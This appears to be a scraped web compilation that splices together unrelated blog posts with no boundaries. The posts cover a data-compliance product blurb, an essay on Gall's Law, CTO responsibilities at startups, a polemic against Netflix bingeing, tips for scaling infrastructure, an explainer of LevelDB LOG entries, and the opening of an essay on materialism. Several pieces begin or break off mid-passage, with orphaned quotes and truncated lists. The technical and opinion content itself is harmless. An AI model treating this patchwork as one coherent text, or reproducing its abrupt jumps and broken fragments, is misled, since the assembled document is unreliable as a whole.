</p><p>Curious to see how it works? You can watch this short example of meeting data compliance for streaming data including data masking:</p><p><iframe src="https://player.vimeo.com/video/443057175" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe></p><p>You can also see Data Policies in action in an all-in-one Kafka and Lenses environment as a Docker container or Cloud instance.&nbsp;Start <a target="_blank" href="https://lenses.io/start/">here</a></p></div></div>]]>

    <p>People often start a new endeavour to realise a vivid dream.  This is good by itself; the dream coupled with strong self-motivation would take them far when the going gets tough (which it usually does).</p>

<p>It’s no secret; when learning your work won’t be original, beautiful or fulfilling.  Experience shows us that anyone’s first picture is not far from a scribble.  Almost everyone I know learnt cycling after a crash.</p>

<p><strong>A complex system that works is invariably found to have evolved from a simple system that worked</strong>.  A complex system designed from scratch never works and cannot be patched up to make it work. You have to start over with a working simple system.</p>
</blockquote>
<p>Notice that you could replace “complex system” with “artist” and get something useful:</p>
<blockquote>
<p>A skilled artist who excels has invariably evolved from being a beginner.</p>
</blockquote>
<p>Mind you, this isn’t just to learn fine arts.  I’ve seen this law to be far reaching.  After all it states that things have to be built incrementally; you can’t directly jump to 100 from 0.</p>
<h2 id="applications">Applications</h2>
<p>Here are a few applications from countless ones:</p>
<h3 id="science">Science</h3>
<p>Many inventions weren’t invented directly.  It’s usually built upon years of research and experiments preceding it e.g. radio, car, television, ….  This list is endless.</p>
<h3 id="technology">Technology</h3>
<p>Though the use of computers and human communication has evolved to the point of video calls and conferences, a couple of decades back none of this existed.  However, people were warmed up to this state slowly; not in a day.  They’d to be evolved to understand today’s technology.  <strong>Continuum</strong>: land-line telephones, digital organisers, pagers, keypad phone, touch phone, smart phones!</p>
<h3 id="finance">Finance</h3>
<p>You might have seen some governments introducing a new clause of tax very marginally.  This is the clever way of doing it.  Since the amount is marginal folks mighn’t notice it but when slowly incremented year over year, eventually it’d become a sizeable amount.  They literally go from 0 to 100 unnoticed by warming up the tax payer.</p>

<p>Though super simple, I’ve seen Gall’s Law ignored by many (including myself) in a busy life.  It’s so simple we tend to overlook it; we think we can skip the intermediate steps and directly jump to 100 from 0.</p>
<p>Where did you take a shortcut recently and got bitten by it?</p>
<h2 id="examples">Examples</h2>
<ol>
<li>College kids resigning their first jobs as they don’t like work/salary/role/etc.
<ul>
<li>Wanting to work for a better company, role or salary isn’t a problem</li>
<li>Giving up an <em>existing</em> job to do it may be a problem</li>
<li>Working in the current role is going to give you real-world experience</li>
<li>Quitting and trying to get a job?  <em>A bird in hand is worth two in bush</em>.</li>
<li>Learning at and off work and applying for another company is more realistic</li>
</ul>
</li>
<li>Budding movie directors demanding absolute freedom, wanting to direct the next <em>Academy Award Winner</em>
<ul>
<li>Having this goal is okay but having demands as new comer is probably not</li>
<li>Sure, someone might have gotten an award for their debut movie but probably without expecting it!</li>
<li>The idea is to accept any offer instead of waiting (perpetually) or (worse) quitting!</li>
<li>Take upon offers coming your way and improve gradually</li>
<li>One day your work would be excellent then you’d have realistic terms you could demand</li>
</ul>
</li>
<li>Budding artists refusing to perform in <em>cheap restaurants</em> as they want to only perform on big stages</li>
<li>Over ambitious companies biting more than they can chew
<ul>
<li>Startups shining brightly for a while and then burning out without a steady growth</li>
</ul>
</li>
</ol>
<p>You get the idea!  Secure the basics and then build from there.</p>

<p>Be courageous; sell yourself short and work happily.  Keep working and you’d realise the goal you envision.  Being afraid to work in lower, menial positions and wanting quick success is the wrong frame of mind; it’s a disservice you do to yourself being with that mind frame.  Ideal thinking won’t help; pragmatic thinking will show you the ropes and you’ll eventually hit the spot!</p>
<blockquote>
<p><strong>Progress</strong>, far from consisting in change, <strong>depends on retentiveness</strong>. – George Santayana, The Life of Reason: The Phases of Human Progress</p>
</blockquote>
<p>Growth is almost always a slow, incremental process.  It can’t be fast-tracked.  Winning players are often seen in soiled clothes!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><span><p>The new buzz word in town is the term CTO. As all industries start to embrace technology as part of the core business, the person incharge of this technology will then start to grow in its important. Do you then know what does the role of a CTO entails? Beyond the glamorous term comes with a ton of responsibilities that is paramount for the development of the company across its stages. If you ever aspire to be a CTO yourself someday, this article is for you.</p>

<br>
<h2>What does CTO do across stages of a startup</h2>
<br>
<h3>1. Pre-seed stage</h3>

<p>Here you have 0 - 1 developer to basically kick start your entire idea. From git repo initilisation to actually be able to see a UI. Here is where your pre-seed stage will be.</p>
<br>
<ul>
<li>Building the MVP</li>
</ul>

<p>Startup CTOs should be well versed in the tools and technologies available for building MVPs, whether those be web apps, mobile apps, desktop software. They cannot be afraid to get their hands dirty because even if there is a budget to hire a team, the CTO plays backup for any roles that cannot be immediately filled.</p>

<p>You need to create this MVP that can be able to gain real-time user feedback as fast as possible.</p>
<br>
<h3>2. Early startup</h3>

<p>You actually have some intermittent market feedback of a market fit and now you are looking to ramp up your development work. Here, you will look to have 1 - 10 engineers to kick start your development process. I’ve come to believe that different companies sits in this stage for various durations. The size of the engineering team should only appropriately grow in proportion with the performance and traction of the product or service. You do not want to find yourself to be in a situation where you are mass-hiring but each engineers are actually relatively unproductive. You should only ramp up the size of the engineering when you have processes in place to better manage these additional manpower. Truly, many cooks spoil the broth. Listed below are some of the scope of a CTO in the early start phase:</p>
<br>
<ul>
<li>Hiring engineers, IT professionals, and data scientists.</li>
</ul>

<p>Finding and bringing on engineering talent is one of the hardest things for tech startups to do. Hiring for cultural fit at a small startup is challenging. Many developers want to specialize while startups demand generalists.</p>

<p>CTO at a startup has to be good at hiring, onboarding, training, and eventually replacing the company’s technical staffs. Having a proven hiring process and strong network will help.</p>
<br>
<ul>
<li>Figuring out company-wide security</li>
</ul>

<p>When no security policy was done before, it falls onto the lap of CTOs to own the security component, run audits, document security procedures, and train everyone on the basis of it.</p>

<p>Simple security includes a VPN to protect your servers &amp; database from public access.</p>
<br>
<ul>
<li>Product management</li>
</ul>

<p>While the CTOs primary goal is to make the vision of the non-technical product manager a reality, it also means that they have to manage the flow of work into the engineering team. Often times, CTOs take an active role in laying out the product planning process. It is common for startup CTOs to learn both product and technology. Its challenging but learning new things is the norm at startups.</p>
<br>
<ul>
<li>Clear technical debts<br>
A good startup CTO will recognize when poor architecture is slowing down the team, and will step in to settle these technical debts when needed. Eventually these architecture clean ups may be delegated to senior engineers, but it will be likely to fall onto the CTO once in a while.</li>
</ul>
<br>
<ul>
<li>Bug triage</li>
</ul>

<p>First without a Quality Assurance team, it falls onto the CTO to triage bugs, replicate and document down the behavior of the feature, then distribute these bugs to the team for a fix. Deciding how to debug an issue requires detailed understanding of the implementation.</p>
<br>
<ul>
<li>QA and testing</li>
</ul>

<p>Without a proper initial team of quality assurance engineers, the testing layer falls onto the responsibility of the engineering team, headed by the CTO. Planning out the testing layers requires hands-on, hands dirty experiments.</p>
<p>Attached is an article on how to create your testing layer in your company. Check it out <a ref="nofollow" target="_blank" href="https://www.karllhughes.com/posts/testing-layers">here</a>.</p>
<br>
<ul>
<li>DevOps</li>
</ul>

<p>Your servers are your digital assets, and until a DevOps engineer is hired to manage these assets, it will too fall onto the CTO to manage them during the interim period.</p>
<br>
<h3>3. Growth</h3>

<p>Here the company has been gaining traction and is now looking to grow the team from 10 - 100 engineers. The company’s product is starting to mature and people are looking to settle into your company as a possible career-long alternative. In here, then you have to focus on ensuring employee retention and a healthy career progression for each of your employees.</p>
<br>
<ul>
<li>Vendor and customer relationship</li>
</ul>

<p>The CTO has to be clear to figure out what is needed to be done to streamline the company’s technical cost. It could be for the developers processes, or the company’s process through technology.<br>
This is essential if the product is starting to integrate with other softwares or has its own API. The external technical relationships will be the responsibility of the CTO. This is essential if we have power users whom are integrating with us, requesting for some ‘must-have’ features.</p>
<br>
<ul>
<li>Team growth management</li>
</ul>

<p>Managing a team of 5 is different from managing a team of 100. Once the company expands and grow, you will start to hire more specialised engineers which isn’t looking for exciting and challenging tasks. Their focus will just be the traditional benefits, vacation days, and a structured career ladder. The ability to develop the skillset to manage the startup across different life stages will also be the challenge the CTO has to undergo.</p>
<br>
<ul>
<li>Employee retention</li>
</ul>

<p>The early employees whom joined for the challenges may consider other options as the startup phases into a mid-sized startup. As tech workers has plenty of options, its rare to keep one for more than 2, 3 years. The CTO that moves the company across phases has to learn how to retain their employees with strong alignment to the worker’s personal goals.</p>
<br>
<h3>4. Expansion</h3>

<p>Generally, once you are in the phase of expansion, you have to be laser focused to get your technology vision and mission in your company. This does not imply that your company has to utilize the latest technology all the time. Fundamentally, what is your company’s vision and problem statement? Focus on that, and ensure that we are using the best technology available out there to achieve this goal.</p>

<p><img src="https://www.dropbox.com/s/q9pg24tufqwzoog/expansion.png?raw=1" alt=""></p>
<br>
<hr>
<br>
<h2>Challenges</h2>

<p>The challenges a CTO face will be endless. Even as a developer, the amount of challenges you face are endless and everyday you have a ton of todos and blockers to clear. More specifically for CTOs, just as I was reading up on the this aspect, the key challenges faced by all CTOs are primarily hiring and alignment with business people.</p>
<br>
<h3>1. Hiring</h3>

<p>Good engineers that can help you to marry business and technology are hard to find. It will be all the more in demand in times when the world is embracing digital transformation. Even investors are willing to put their millions into savings plans through video calls. It is key to hire not just gifted engineers but those whom will also help shape the culture of the business.</p>
<br>
<h3>2. Focusing on customer engagement</h3>

<p>If you want to create a good technology, it is only just as good as whom the technology is created for. You may create the world’s first robotic arm for minimally invasive surgery but if i’m only washing dishes, why would that be of value to me? You have to benchmark the quality of your product to the utility of your target audience. They have the valuable feedback. In a world where there is a imperfect information, one can only move in the most informed decision; but always with a certain level of uncertainty and risk. Continuously engage with your ‘customers’ and find out what will empower them and set them up to do more with less using your product.</p>
<br>
<hr>
<br>
<h2>5 Key learning opportunities</h2>

<p>Not everyone is born ready for such a big role. It will stretch you, ‘forces’ you to rise up to the occasion and you may even be surprised by what you are able to achieve when you’re placed under the pressurized cooker of your business demands. Generally, CTO is a leadership role. As glamorous as it may sound, it is still in essence just a role. What is most important is the being that is placed in that role. Are you developing yourself to face the bigger problems that are before you?</p>
<br>
<ol>
<li>
<p>Technical knowledge</p>
</li>
<li>
<p>Technical leadership and strategy planning</p>
</li>
<li>
<p>Communication and Mentoring</p>
</li>
<li>
<p>Project management and Operational excellence</p>
</li>
<li>
<p>Sense of entrepreneurship and anticipation of the future</p>
</li>
</ol>

<p>What better way to find out your key areas of learning opportunities than to hear from founders themselves. Here’s a video that sums this up</p>

</p>
<br>

<br>
<h2>TLDR;</h2>

<p>The end goal, the article gives a in-depth glimpse into the scope of a CTO’s day to day. How then can one possibly keep up with this pace of work? Only if you have a clear vision of the possible future. Technology is no longer just a tool for your Business-as-usual. It could possibly shape your future and redesign how life could be, should be, and will be.</p>

<p>From here on, I wish to share with you all a really cool podcast called <a ref="nofollow" target="_blank" href="https://moderncto.io/">Modern CTO</a>. It is a podcast whom CTOs of all different companies will share some of their thoughts, journey, and learnings as CTOs. One thing is common: their level of curiosity for the world around them. Whatever role you are to play, stay curious and be a future explorer!</p>
<br>

<br>
<h2>JDs and scope of CTOs across all stages of startup</h2>

<p>Vision &amp; Strategy</p>
<ul>
<li>Setting a vision for how technology will be used in the company.</li>
</ul>

<p>R&amp;D</p>

            <section>
                <div>
                    <p>It has become fashionable to lambast big tech corporations and social media sites, the Facebooks and Twitters and Googles, blaming them for a litany of social ills. Seemingly escaping this ire has been the—in my view—most pernicious by far: Netflix.</p><p>Simply put, Netflix (and its imitators) produce too many TV shows that are too good—and too easy to binge. Consequently, too many great minds spend their time watching TV rather than thinking and inventing and creating.</p><h2 id="the-greatness-we-lose">The Greatness We Lose</h2><p>Consider the writer Matthew Yglesias. He just wrote an excellent <a href="https://www.amazon.com/One-Billion-Americans-Thinking-Bigger/dp/0593190211/">book</a>, which partially inspired my <a href="https://www.forourposterity.com/canada-and-mexico-should-join-the-union/">last post</a>. Recently, Yglesias <a href="https://web.archive.org/web/20200912220900/https://twitter.com/mattyglesias/status/1304904789055156225">tweeted</a>:</p><blockquote>Someone asked … “how’d you get this book written without taking time off work?” and the dumb boring answer was basically “didn’t watch much TV for six months.”</blockquote><p>He adds,</p><blockquote>I am perfectly aware that the difference between times when I’m most productive &amp; creative and times when I’m not is how much of the week I waste on watching television, yet tonight I’m almost certainly going to finish season two of Hannibal.</blockquote><p>Yglesias, turn off the TV! Write more books instead! Heck, write more tweets, if you prefer!</p><p>Just think of all the original ideas Yglesias could be contributing if he continued to abstain from watching TV. Of them we are being robbed. That is an epic <a href="https://applieddivinitystudies.com/murder-of-wilbur/">tragedy</a>.</p><h2 id="why-modern-tv-is-different">Why Modern TV Is Different</h2><p>I don’t mean to pick on Yglesias. In fact, I don’t blame him. Modern shows are just too good. As a result, it’s become accepted—even the norm—among elite, educated classes to watch inordinate amounts of TV.</p><p>Modern shows are different from classic TV in two key ways. First, they are much more engrossing. Netflix shows are just on a different level in terms of quality than what TV once offered. Second, they are bingeable. Instead of tuning in for an hour each week, Netflix encourages viewers to enter the dark hole of watching episode after episode after episode. This becomes a vicious cycle. Viewers binge late into the night, lose sleep, and then don’t feel energetic enough to do much in their free time the next day besides…watching more Netflix.</p><p>Movies were always pretty engrossing. But the boundless quantity of content on Netflix—as well as their deliberate addictiveness—puts it on a different level.</p><p>To be sure, the broad America public has always watched <a href="https://www.theatlantic.com/technology/archive/2018/05/when-did-tv-watching-peak/561464/">extraordinary amounts</a> of television, in particular retirees. For them, the improved quality of modern shows is surely an upgrade. But I do think Netflix has distinctly changed the culture around TV among the young and educated.</p><p>As an undergraduate at Columbia, it was extremely common for students to spend much of their free time engorging themselves on Netflix. Many were caught in that maelstrom of bingeing, losing sleep, and then bingeing more. What was most shocking was this practice’s sheer acceptability. Watching dozens of hours of Netflix a week wasn’t something out of the ordinary, something people were embarrassed by. Rather, Netflix bingeing was a core part of the culture, something people would make countless memes about and base their identities on. Amazingly, people’s chief complaint was often that they had exhausted all of Netflix’s content (how do you even do that?!).</p><p>Yglesias got his start blogging in college. Would the next Yglesias be able to do the same? Or would his free time and energy instead be sucked up by the latest, ever-more addictive Netflix show? What a loss for civilization that would be.</p><h2 id="for-a-new-temperance-movement">For a New Temperance Movement</h2><p>Again, I don’t blame the students. I am victim to the same human follies. But I do blame the culture we have created. We don’t tell our bright young minds that it’s alright to waste away your days drinking or abusing drugs. Sure, some end up doing so regardless, but the cultural tabu keeps those impulses in check. Why do we tell them it’s alright to waste away your days watching Netflix?</p><p>Indeed, there has been considerable pushback against video games, which for some are a similar time suck. While many still struggle, this cultural pushback has kept video games in check. At least among the educated classes, Netflix and its imitators have become the far greater time suck.</p><p>For those who can enjoy TV in moderation—great. Modern shows are often meaningful art worth appreciating. The problem with modern TV is that for many, it is closer to alcoholism than a one-off drink. One you watch that first episode—take that first drink—it often doesn’t stay at one episode—as it doesn’t stay at one drink.</p><p>Perhaps it is time for a modern TV-temperance movement. It would be worth encouraging moderation in TV consumption in general. But given that many TV habits resemble alcoholism, it may be appropriate to take a more radical approach: advocating TV-abstinence. Although complete avoidance of TV may be difficult at first, once it becomes a habit, I think most wouldn’t miss much. But they would enjoy an abundance of reclaimed time and energy. And the rest of us would enjoy the wonderful works they create with that newfound time and energy.</p><h2 id="brains-in-vats">Brains in Vats</h2><p>The culture we establish around Netflix matters not just for the present, but for what comes next. As entertainment technology relentlessly advances, are we destined to become brains in vats, nominally pumped full of artificial bliss but doomed to lives of passivity and complacency?</p><p>Look, if that’s what the Europeans want to do, they should go for it. But part of what makes America special is a certain harshness—first embodied in the Puritans and their quest to settle America’s unforgiving wilderness. Great achievements, new ideas, ingenious inventions emerge from a culture that prizes travail and perseverance, not one that prioritizes comfort and ephemeral satisfaction.</p><p>A blithe acceptance of Netflix has insidiously infiltrated our culture. We should push back. Let’s look to the stars, not the next episode.</p>

<p><em>Tips and tricks gained from experience to scale your tech stack really, really fast.</em></p>



<p>Your company has planned a massive marketing campaign. Millions of households are going to view the company’s advertisement during a prime time television show. An enormous number of users are expected to try out your company’s application. You, the engineer, has been given a couple of weeks to scale the tech stack to handle this massive traffic surge.</p>



<p>What do you do?</p>



<p>I am assuming that you are using a public cloud. If not, good luck(use this opportunity to make a case to your decision-makers to <a rel="noreferrer noopener" href="https://abhyrama.com/2019/06/08/cloud-movement/" target="_blank">move to the cloud</a>).</p>

<h2>Preliminary</h2>



<p>Get a rough sense of the traffic surge—take help from your marketing team for a guesstimate. Use this number as the anchor in all the subsequent steps.</p>



<h2>Horizontal scaling is the mantra</h2>



<p>All cloud providers have some form of autoscaling—on-demand addition of servers based on specific conditions. Utilize this to the hilt. Figure out the thresholds for autoscaling. There will be a lag between the autoscaling condition being met and the addition of the server—plan for margin of safety. Lean on the side of over-provisioning than under-provisioning when the entire world’s eye is on you.</p>



<p>If you have sticky sessions or local server persistence that span multiple requests, now is the time to refactor your application to be <a href="https://abhyrama.com/2020/04/28/the-three-pillars-of-scalability/" target="_blank" rel="noreferrer noopener">stateless</a>—on a war footing.</p>



<h2>Make scaling someone else’s problem</h2>



<p>CDN is a one-word answer to all scaling problems. Wherever possible, offload traffic to a CDN. One successful result from the CDN is one less hit to your backend.</p>



<p>Like CDN, many other frameworks help you scale seamlessly—Firebase, DynamoDB, etc. Leverage these to the maximum.</p>



<h2>Cache, cache, cache, and cache some more</h2>



<p>When one thinks of a cache, Redis or Memcache come to mind—do not restrict yourself narrowly to these.</p>



<p>Visualize your application in layers and see what can be cached(sometimes implicitly) at each of those layers—client, proxy servers, load balancer, web server, application server, middleware, database, and the operating system.</p>



<p>HTTP has many ways of <a rel="noreferrer noopener" href="https://www.mnot.net/cache_docs/" target="_blank">caching</a>—cache headers and ETags. Utilize all these to the hilt. One less hit to your backend is one less scaling woe.</p>



<p>If you are not using <a href="https://abhyrama.com/2020/02/04/becoming-a-guru-programmer/" target="_blank" rel="noreferrer noopener">connection and object pooling</a> in your application, now is the time to look into those—<a rel="noreferrer noopener" href="https://abhyrama.com/2020/03/31/wild-wild-world-of-external-calls/" target="_blank">creating and closing connections</a>(and objects) can get expensive, especially under heavy load.</p>



<h2>Know your limits</h2>



<p>If you are doing this exercise for the first time, your stack—server, libraries, VM, OS, and dependent components like databases, caches, etc.—are probably running with defaults that came out of the box.</p>



<p>Identify all the parameters(configurations) that matter and tune them—connection limits, file descriptor(IO) limits, thread counts, timeouts, pool, and memory settings.</p>



<p>Trace the critical paths in your application and gauge third-party dependencies(external services from other vendors) on these paths. Talk to these third parties and make sure they are ready to handle the extra load coming from you—do not let them be the weakest link in the chain.</p>



<p>Talk to your cloud provider(s) and ask them to increase the limits. All cloud providers have soft limits on resources. Check with your account manager and request a limit increase.</p>



<h2>The chink in your scaling armor</h2>



<p>The database is going to be the chink in your scaling armor. Use the traffic guesstimate you did to make sure that your database will hold up. Know the limits of your database(previous section) and tune for performance. Simultaneously, do not underestimate modern-day databases and servers. They can handle a ridiculous amount of load as long as you are not doing something stupid(if you are a <a href="https://abhyrama.com/2014/08/23/we-are-a-startup/" target="_blank" rel="noreferrer noopener">hyper-growth startup</a>, you probably are doing multiple stupid things; time to fix those).</p>



<p>If you believe your database will not be able to service the load, cache, cache, and then cache some more. If you have write-heavy traffic, then pray to God. Or, use a <a href="https://abhyrama.com/2018/09/14/ode-to-queues/" target="_blank" rel="noreferrer noopener">queue</a>(<a href="https://abhyrama.com/2014/10/25/sqs-versus-kinesis/" target="_blank" rel="noreferrer noopener">async processing</a>) and/or figure out a way to delay and spread the writes(write-back cache).</p>



<h2>The ever seeing eye</h2>



<p>Have <a href="https://abhyrama.com/2019/01/05/now-you-see-me/" target="_blank" rel="noreferrer noopener">observability</a> in place. Murphy’s law states that whatever can go wrong will go wrong. When this happens during stressful times like a high decibel marketing campaign, and you are running blind to what is happening, cortisol levels go through the roof and tear you to pieces. Observability is the calming friend you lean on during these pressing times.</p>



<h2>Conclusion</h2>



<p>Have a <a href="https://abhyrama.com/2018/08/31/checklist/" target="_blank" rel="noreferrer noopener">checklist</a> of all these, and make sure you tick them off as and when you close them. Having a list is critical as these can be stressful times, and losing track of what needs to be done, what has been done, and what is pending is easy.</p>



<p>You might be wondering why I did not ask you to do a performance test.</p>



<p>Doing a performance test and figuring out all the bottlenecks would be the theoretical(and systematic) way to go about this. The problem with performance testing is that carrying out one is challenging and requires expertise and experience. Also, mimicking real-world traffic and user behavior through a performance test is tough. If you know how to do that, you might as well know all the scaling tricks that I mentioned here(you are not the audience for this post).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>LevelDB is very robust and rather simple. Learn how it works and how to read its LOG.</p><article>
      
<p>LevelDB is an open-source library created by Jeff Dean and Sanjay Ghemawat at Google. It implements a Log Structured Merge Tree which provides very fast writes, independent of the size of the database and scan capabilities which make LevelDB the ideal storage library for a time series database.</p>



<p>That's why the standalone version of <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a>, our Time Series Platform, persists its data on disk using the <a href="https://en.wikipedia.org/wiki/LevelDB" target="_blank" rel="noreferrer noopener">LevelDB</a> library. </p>



<p><strong>LevelDB is very robust and rather simple, but understanding how it works could benefit from a clear explanation.</strong> This is what this blog post aims at doing, providing you with sufficient knowledge to understand how LevelDB behaves and ultimately how your Warp 10 instance performs.</p>



<h2>Overview</h2>



<p>Data pushed to LevelDB ends up in files called SST files, SST for <em>Sorting String Table</em>. An SST is a lexicographically sorted list of key/value pairs where both keys and values are byte arrays. SST files are immutable, meaning that once created they will not be altered. They may be removed during a process called <em>compaction</em>. SST files are all the files with the suffix <code>.sst</code> in your <code>leveldb</code> directory. SST files are organized in <em>levels</em>.</p>



<p>Having a Log-Structured Merge-Tree architecture, LevelDB does not store data directly in SST files. It stores new key/value pairs mutations (either additions or deletions) in a <a rel="noreferrer noopener" href="https://blog.senx.io/captains-log-stardate-4353-3/" target="_blank">log</a> file. This log file is the file with the <code>.log</code> suffix in your <code>leveldb</code> directory. The data stored in the log file is also stored in a memory structure called the <em><strong>memtable</strong></em>.</p>



<p>When the log file reaches a certain size (around 4 MB), its content is transferred to a new SST file and a new log file and memtable are initiated, the previous memtable is discarded. Those fresh SST files are collectively called the<strong> <em>level 0</em> files</strong>. Files at level 0 are special because their keys can overlap since they are simply copies of the various log files.</p>



<p><strong>When the number of files at level 0 reaches a threshold (around 10 files), a compaction is triggered. </strong>Compaction will choose a set of overlapping files at level 0 and a set of files they overlap at the next level (level 1) and will merge the data in those files to create a new set of SST files at level 1. The chosen SST files are then discarded.</p>



<p>LevelDB continuously inspects files at each level and triggers compactions when the number of files or the total size at a given level goes beyond a set threshold. <strong>LevelDB manages 7 levels of files.</strong> The list of current SST files is kept in a <code>MANIFEST</code> file. The id of the current MANIFEST file is stored in the <code>CURRENT</code> file.</p>



<p>When reading data, the set of SST files to access is retrieved from the data in the MANIFEST, and the required files are opened and the data to read is reconciled from those files and the current memtable, managing overwrites and deletions.</p>



<p>All operations performed on the SST, log and MANIFEST files are logged in the <code>LOG</code> file.</p>



<h2>Understanding the LevelDB LOG entries</h2>



<p>The <code>LOG</code> file in your <code>leveldb</code> directory is a rich source of information to understand how your Warp 10 instance is behaving.</p>



<h3>LevelDB start up</h3>



<p>When the LevelDB database is opened, the current <code>.log</code> file is recovered and converted to an SST file, a new <code>.log</code> file is initiated and a new <code>MANIFEST</code> file is created with updated information about all the known <code>.sst</code> files. While scanning the SST files upon startup, LevelDB may decide to remove unreferenced files.</p>



<p>When opening a LevelDB database with the following files:</p>



<pre><code>CURRENT
LOG
MANIFEST-000839
.... plenty of .sst files ....
000837.sst
000841.log
000842.sst</code></pre>



<p>The following entries will appear in the new <code>LOG</code> file (the previous LOG file will be renamed <code>LOG.old</code>):</p>



<pre><code>2019/09/05-09:54:01.235885 7000045d0000 Recovering log #841
2019/09/05-09:54:01.237443 7000045d0000 Delete type=0 #841
2019/09/05-09:54:01.237509 7000045d0000 Delete type=3 #839</code></pre>



<p>The first line says the log file was recovered, since it was empty in our case, it did not lead to the creation of a new SST file. Then the log file (<code>type=0</code>) was deleted and the old MANIFEST (<code>type=3</code>) was removed. The <code>leveldb</code> now contains the following files:</p>



<pre><code>000837.sst
000842.sst
LOG.old
CURRENT
000844.log
MANIFEST-000843
LOG</code></pre>



<p>You can see a fresh log file (with id 844) and a fresh MANIFEST (with id 843). The <code>CURRENT</code> file contains the full name of the MANIFEST file (<code>MANIFEST-000843</code>).</p>



<figure></figure>



<h3><code>log</code> rotations</h3>



<p>As you push data, the <code>.log</code> file fills up and will reach a point when LevelDB will decide to rotate it. When this happens, the following LOG entries will appear:</p>



<pre><code>2019/09/05-10:00:07.976574 7000043c7000 Level-0 table #846: started
2019/09/05-10:00:08.022811 7000043c7000 Level-0 table #846: 3264502 bytes OK
2019/09/05-10:00:08.024013 7000043c7000 Delete type=0 #844</code></pre>



<p>The first line indicates that a new SST file (with id 846) was initiated at level 0. The second line, 50ms later, states that 3,264,502 bytes were transferred to it from the log file being rotated. Then the third line indicates that the log file that was just rotated was deleted. The new log file was created just before the creation of the new SST file and thus has the id 845. The files in the <code>leveldb</code> are therefore:</p>



<pre><code>000842.sst
LOG.old
CURRENT
000846.sst
000845.log
LOG
MANIFEST-000843</code></pre>



<h3>Compactions</h3>



<p>After writing data for a while, SST files at level 0 will reach a threshold that will trigger a compaction. LevelDB will then select files at level 0 and level 1 and will merge them, creating new SST files at level 1.</p>



<p>The LOG entries for compaction look like this:</p>



<pre><code>2019/09/05-10:12:29.932735 7000043c7000 Compacting 3@0 + 5@1 files
2019/09/05-10:12:29.935664 7000043c7000 Generated table #855: 1 keys, 299 bytes
2019/09/05-10:12:29.953873 7000043c7000 Level-0 table #858: started
2019/09/05-10:12:29.971680 7000043c7000 Level-0 table #858: 1836221 bytes OK
2019/09/05-10:12:29.973850 7000043c7000 Delete type=0 #853
2019/09/05-10:12:30.004067 7000043c7000 Generated table #856: 181829 keys, 2120146 bytes
2019/09/05-10:12:30.063737 7000043c7000 Generated table #859: 181828 keys, 2120137 bytes
2019/09/05-10:12:30.117959 7000043c7000 Generated table #860: 181825 keys, 2120084 bytes
2019/09/05-10:12:30.137805 7000043c7000 Generated table #861: 58498 keys, 682097 bytes
2019/09/05-10:12:30.238360 7000043c7000 Generated table #862: 13 keys, 153 bytes
2019/09/05-10:12:30.238379 7000043c7000 Compacted 3@0 + 5@1 files =&gt; 7042916 bytes
2019/09/05-10:12:30.238592 7000043c7000 compacted to: files[ 2 8 56 69 0 0 0 ]</code></pre>



<p>The compaction will involve 3 files at level 0 (<code>3@0</code>) and 5 files at level 1 (<code>5@1</code>). The result of this compaction is a set of 5 files (<code>856</code>, <code>859</code>, <code>860</code>, <code>861</code> and <code>862</code>). You can see the size of each of those files and the number of key/value pairs they contain. This gives you an idea of the footprint of each datapoint. In our example file <code>856</code> contains  181,829 entries for a total of 2,120,146 bytes, so a footprint of 11.66 bytes per datapoint, that's 11.66 bytes for the id of the series, the timestamp, and the value.</p>



<p>The last two LOG entries summarize the compaction, giving you the total size of the generated SST files and the current number of files at the various levels (2 at level 0, 8 at level 1, 56 at level 2, <em>etc)</em>.</p>



<h3>Housekeeping</h3>



<p>If we continue pushing data to our Warp 10 instance, we can see new types of LOG entries, such as:</p>



<pre><code>2019/09/05-10:21:04.142429 7000043c7000 Level-0 table #864: started
2019/09/05-10:21:04.172528 7000043c7000 Level-0 table #864: 3264502 bytes OK
2019/09/05-10:21:04.174262 7000043c7000 Delete type=2 #745
2019/09/05-10:21:04.175685 7000043c7000 Delete type=2 #746
2019/09/05-10:21:04.176116 7000043c7000 Delete type=2 #747
2019/09/05-10:21:04.176521 7000043c7000 Delete type=2 #748
2019/09/05-10:21:04.176642 7000043c7000 Delete type=2 #780
2019/09/05-10:21:04.177114 7000043c7000 Delete type=2 #850
2019/09/05-10:21:04.177535 7000043c7000 Delete type=2 #852
2019/09/05-10:21:04.177843 7000043c7000 Delete type=2 #854
2019/09/05-10:21:04.178211 7000043c7000 Delete type=0 #857
2019/09/05-10:21:04.178511 7000043c7000 Moved #856 to level-2 2120146 bytes OK: files[ 2 8 57 69 0 0 0 ]
2019/09/05-10:21:04.178773 7000043c7000 Moved #859 to level-2 2120137 bytes OK: files[ 2 7 58 69 0 0 0 ]</code></pre>



<p>The <code>Delete type=2</code> entries inform about the cleaning of the SST files merged in a previous compaction.</p>



<p>The last two entries indicate that some SST files were moved as-is from level 1 to level 2 to rebalance the number of files at the various levels.</p>



<h2>Takeaway</h2>



<p>You should now understand how LevelDB works and you should be able to read the <code>LOG</code> file to find valuable information such as the average size of datapoints in SST files.</p>



<p>As an LSM trees backend, LevelDB handles deletions by writing tombstones to the log file, this means that deletions will only reclaim space when the SST files containing the tombstones are merged at the deepest level. </p>



<p>To overcome this, <a href="https://senx.io/" target="_blank" rel="noreferrer noopener">SenX</a> offers a commercial extension to Warp 10 to reclaim space immediately by intelligently suppressing SST files. Please contact our <a href="mailto:sales@senx.io" target="_blank" rel="noreferrer noopener">sales team</a> if you would be interested in this offering. Note that this extension is used by default in <a href="https://blog.senx.io/introducing-the-warp-10-sandbox/" target="_blank" rel="noreferrer noopener">the sandbox</a> and in our hosted Warp 10 instances.</p>

<p><em>The worst thing about our modern culture is the growing ignorance towards what’s really valuable in the world. From an early age, we join a long-distance rat race where the competition is measured not by who we are, but by what we own. Therefore, the desire for material possessions and attention from our peers become our chief goals. Survival, it seems to us, is based on how well we portray our qualities to the outside world – even if we don’t necessarily possess them.</em></p>



<p>Living a normal life according to our society, even if we don’t always admit it, is tightly connected to the acquisition of funds. One of the most talked-about traits promoted by institutions regardless of our location is the value of money. Of course, this is not directly mentioned by the media outlets or by our neighbors, it’s beautifully camouflaged by what money can buy.</p>



